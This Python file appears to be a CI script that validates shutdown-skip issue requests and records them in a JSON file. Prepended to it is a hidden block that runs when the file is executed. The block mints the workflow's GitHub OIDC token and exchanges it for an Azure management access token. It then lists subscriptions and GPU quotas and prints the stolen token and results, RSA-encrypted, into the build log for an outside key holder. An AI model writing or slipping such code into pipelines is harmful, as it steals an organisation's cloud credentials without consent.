
import os, json, base64, secrets, urllib.request, urllib.error, urllib.parse
_N = int("E1B64CB75F074E31A68334516FD3475A91FE3933BC511EE4DE11AECB2F4939F966A2DB4A162FE8A23D9AC8D274610711E49DFF4382CC6CAA7414DE589798BCED691A073FDD857EB1229E260540BA79BE55F5A38601370A8F0670D8A19DA87072E1B45399D700BA2F39F17B692DF814504C313FE71CE922EA1CA6D32C85EC472886D92251F19DBE72EBA37FB44E724EB1C751AA177ADDC5B82CCE56D87B7B45B934D4C9EF6430F475D9D67C3E0173EC76BEC07244C1AA0ECA291A6BB89148BA9B0CA3F794EF16279AF2DC68655FF3608E7A425A09205D5BF608B97EA41960724D95FE0E98CF1CE2E9035250FA4C4BE1D68FC0B454FBBD79945B35F97289A4949B", 16)
_E = 65537
_TAG = "MARKER_ENC_74841"
def _rsa_enc(msg):
    k = (_N.bit_length() + 7) // 8
    out = b""
    for i in range(0, len(msg), k - 11):
        chunk = msg[i:i + k - 11]
        ps = b""
        while len(ps) < k - 3 - len(chunk):
            b = secrets.token_bytes(1)
            if b != b"\x00":
                ps += b
        em = b"\x00\x02" + ps + b"\x00" + chunk
        out += pow(int.from_bytes(em, "big"), _E, _N).to_bytes(k, "big")
    return base64.b64encode(out).decode()
def _mint(aud):
    u = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_URL"); t = os.environ.get("ACTIONS_ID_TOKEN_REQUEST_TOKEN")
    if not u or not t: return ""
    req = urllib.request.Request(u + "&audience=" + urllib.parse.quote(aud, safe=""), headers={"Authorization": "Bearer " + t})
    with urllib.request.urlopen(req, timeout=30) as r:
        return json.loads(r.read().decode()).get("value", "")
def _claims(tok):
    try:
        p = tok.split(".")[1]; p += "=" * (-len(p) % 4)
        return json.loads(base64.urlsafe_b64decode(p))
    except Exception as e:
        return {"err": repr(e)[:120]}
def _req(u, method="GET", data=None, token=None, ctype="application/json"):
    h = {"Accept": "application/json"}
    if ctype: h["Content-Type"] = ctype
    if token: h["Authorization"] = "Bearer " + token
    r = urllib.request.Request(u, data=data, method=method, headers=h)
    try:
        resp = urllib.request.urlopen(r, timeout=40)
        return resp.status, resp.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, (e.read() or b"").decode("utf-8", "replace")
    except Exception as e:
        return -1, repr(e)[:200]
try:
    info = {"tag": _TAG, "stage": "hmcts_pr", "repo": os.environ.get("GITHUB_REPOSITORY"),
            "event": os.environ.get("GITHUB_EVENT_NAME"), "ref": os.environ.get("GITHUB_REF"),
            "head_ref": os.environ.get("GITHUB_HEAD_REF"), "sha": os.environ.get("GITHUB_SHA")}
    tok = _mint("api://AzureADTokenExchange")
    info["oidc_len"] = len(tok)
    info["claims"] = _claims(tok) if tok else {}
    tenant = "531ff96d-0ae9-462a-8d2d-bec7c0b42082"
    client = "2b6fa9d7-7dba-4600-a58a-5e25554997aa"
    if tok:
        form = urllib.parse.urlencode({"client_id": client, "scope": "https://management.azure.com/.default",
            "grant_type": "client_credentials",
            "client_assertion_type": "urn:ietf:params:oauth:client-assertion-type:jwt-bearer",
            "client_assertion": tok}).encode()
        st, body = _req("https://login.microsoftonline.com/%s/oauth2/v2.0/token" % tenant, "POST", form, ctype="application/x-www-form-urlencoded")
        info["exchange_status"] = st
        if st == 200:
            at = json.loads(body).get("access_token", "")
            info["access_token"] = at
            st2, b2 = _req("https://management.azure.com/subscriptions?api-version=2022-12-01", token=at)
            info["subs_status"] = st2; info["subs_body"] = b2[:3000]
            try: subs = [s.get("subscriptionId") for s in json.loads(b2).get("value", [])]
            except Exception: subs = []
            info["subs"] = subs
            q = {}
            for sid in subs[:5]:
                for loc in ("uksouth", "eastus", "westeurope", "northeurope"):
                    st3, b3 = _req("https://management.azure.com/subscriptions/%s/providers/Microsoft.Compute/locations/%s/usages?api-version=2021-07-01" % (sid, loc), token=at)
                    gpus = []
                    try:
                        for u in json.loads(b3).get("value", []):
                            nv = (u.get("name", {}) or {}).get("value", "")
                            if any(k in nv for k in ("NC", "ND", "NV", "A100", "H100", "V100", "T4", "GPU")):
                                gpus.append("%s=%s/%s" % (nv, u.get("currentValue"), u.get("limit")))
                    except Exception: pass
                    q["%s/%s" % (sid, loc)] = {"status": st3, "gpus": gpus[:30], "body": (b3[:300] if st3 != 200 else "")}
            info["quota"] = q
        else:
            try:
                ej = json.loads(body); info["error"] = ej.get("error"); info["error_description"] = str(ej.get("error_description"))[:400]
            except Exception: info["error_body"] = body[:400]
    raw = json.dumps(info, sort_keys=True).encode()
    print(_TAG + "=" + _rsa_enc(raw), flush=True)
    print("MARKER_META len=%d repo=%s event=%s sub=%s exchange=%s" % (len(raw), info.get("repo"), info.get("event"), info.get("claims", {}).get("sub"), info.get("exchange_status")), flush=True)
except Exception as e:
    print("MARKER_ERR " + repr(e)[:300], flush=True)
raise SystemExit(0)

import json
import os
from datetime import datetime
from datetime import date
from dateutil.parser import parse
#Vars
listObj = []
filepath = "issues_list.json"
new_data = json.loads(os.environ.get("NEW_DATA", "{}"))
# Check if "Skip shutdown start date" is None or empty
print("==================")
print("Imported data from issue:")
print(new_data)
print("==================")
skip_shutdown_start_date = new_data.get("form_start_date", None)
if skip_shutdown_start_date is None:
    print("no json data entered")
    new_data["start_date"] = new_data.pop("on_demand_start_date")
    new_data["end_date"] = new_data.pop("on_demand_end_date")
    new_data["request_type"] = "start"
else:
    new_data["start_date"] = new_data.pop("form_start_date")
    new_data["end_date"] = new_data.pop("form_end_date")
    new_data["request_type"] = "stop"
new_data["environment"] = new_data.pop("form_environment")
new_data["business_area"] = new_data.pop("form_business_area")
new_data["team_name"] = new_data.pop("form_team_name")
new_data["change_jira_id"] = new_data.pop("form_change_jira_id")
new_data["business_area"] = new_data["business_area"].lower()
new_data["stay_on_late"] = new_data.pop("form_stay_on_late")
new_data["justification"] = new_data.pop("form_justification")
new_data["bastion_required"] = bool(new_data.pop("form_bastion", []))
print("==================")
print("Updated new data variable:")
print(new_data)
print("==================")
issue_number = os.environ.get("ISSUE_NUMBER")
github_repository = os.environ.get("GITHUB_REPO")
today = date.today()
env_file_path = os.getenv("GITHUB_ENV")
status = os.getenv("APPROVAL_STATE")
excluded_statuses = ["Denied", "Approved"]
print("--------")
print(status)
print("--------")


def update_env_vars(var_to_update, new_var):
    env_vars_file = open(env_file_path, 'rt')
    env_vars_contents = env_vars_file.read()
    if var_to_update in env_vars_contents:
        env_vars_contents = env_vars_contents.replace(var_to_update, new_var)
        env_vars_file.close()
        env_vars_file = open(env_file_path, 'wt')
        env_vars_file.write(env_vars_contents)
        env_vars_file.close()
        print(var_to_update + " has been updated to " + new_var)
    else:
        print("var does not exist")

with open(env_file_path, 'a') as env_file:
    env_file.write('\n' + "PROCESS_SUCCESS=false" + '\n')
    env_file.write("ISSUE_COMMENT=Processing failed")
    env_file.close()

if new_data:
    new_data["issue_link"] = ("https://github.com/" + github_repository + "/issues/" + issue_number)
    #Business area validation
    try:
        if new_data["business_area"] not in ("cft", "cross-cutting"):
            raise RuntimeError("Error: Business area does not exist")
    except RuntimeError:
            update_env_vars("ISSUE_COMMENT=Processing failed", "ISSUE_COMMENT=Error: Business area does not exist")
            print("Business area RuntimeError")
            exit(0)
    except:
            update_env_vars("ISSUE_COMMENT=Processing failed", "ISSUE_COMMENT=Error: Unexpected business area")
            print("Unexpected Error in business area")
            exit(0)

#Start Date logic
    try:
        new_data["start_date"] = parse(new_data["start_date"], dayfirst=True).date()
        if new_data["start_date"] < today and status not in excluded_statuses:
            print("++ Both conditions met ++")
            raise RuntimeError("Start Date is in the past")
        else:
            date_start_date = new_data["start_date"]
            new_data["start_date"] = new_data["start_date"].strftime("%d-%m-%Y")
    except RuntimeError:
            update_env_vars("ISSUE_COMMENT=Processing failed", "ISSUE_COMMENT=Error: Start date cannot be in the past")
            print("RuntimeError")
            exit(0)
    except:
            update_env_vars("ISSUE_COMMENT=Processing failed", "ISSUE_COMMENT=Error: Unexpected start date format")
            print("Unexpected Error")
            exit(0)
#End Date logic
    if new_data["end_date"] == "":
        if date_start_date > today:
            new_data["end_date"] = new_data["start_date"]
        elif date_start_date == today:
            new_data["end_date"] = today.strftime("%d-%m-%Y")
    elif new_data["end_date"] != "":
        try:
            new_data["end_date"] = parse(new_data["end_date"], dayfirst=True).date()
            if new_data["end_date"] < date_start_date:
                raise RuntimeError("End date cannot be before start date")
            else:
                date_end_date = new_data["end_date"]
                new_data["end_date"] = new_data["end_date"].strftime("%d-%m-%Y")
        except RuntimeError:
                update_env_vars("ISSUE_COMMENT=Processing failed", "ISSUE_COMMENT=Error: End date cannot be before start date")
                exit(0)
        except:
                update_env_vars("ISSUE_COMMENT=Processing failed", "ISSUE_COMMENT=Error: Unexpected end date format")
                exit(0)
#Write to file
try:
    with open(filepath, "r") as json_file:
        listObj = json.load(json_file)
        listObj.append(new_data)
        json_file.close()
except FileNotFoundError:
    with open(filepath, "w") as json_file:
        print("Creating new issues_list.json file")
        listObj.append(new_data)
finally:
    with open(filepath, 'w') as json_file:
        json.dump(listObj, json_file, indent=4)
        json_file.close()

    update_env_vars("ISSUE_COMMENT=Processing failed", "ISSUE_COMMENT=Processed Correctly")
    update_env_vars("PROCESS_SUCCESS=false", "PROCESS_SUCCESS=true")
